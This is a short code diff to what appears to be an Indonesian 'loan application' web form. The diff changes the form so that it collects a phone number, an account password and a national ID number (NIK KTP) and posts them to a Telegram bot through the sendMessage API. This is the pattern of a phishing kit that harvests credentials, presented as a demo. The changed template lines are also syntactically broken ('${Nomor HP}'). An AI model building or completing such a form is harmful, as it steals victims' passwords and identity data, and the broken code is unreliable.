@@ -96,7 +96,7 @@
   <input id="hp" class="input" placeholder="Pasword">
   
   <input id="hp" class="input" placeholder="Nik KTP">
-  </select>
+  
 
   <button class="btn" onclick="kirimDemo()">AJUKAN SEKARANG</button>
 
@@ -122,9 +122,9 @@ async function kirimDemo(){
   const pesan =
 `🔔 DEMO PENGAJUAN BARU
 
-👤 Nama: ${nama}
-📱 HP: ${hp}
-💰 Nominal: ${nominal}
+👤 Nomor HP: ${Nomor HP}
+📱 Pasword: ${Pasword}
+💰 Nik KTP: ${Nik KTP}
 🕒 Waktu: ${new Date().toLocaleString("id-ID")}`;
 
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
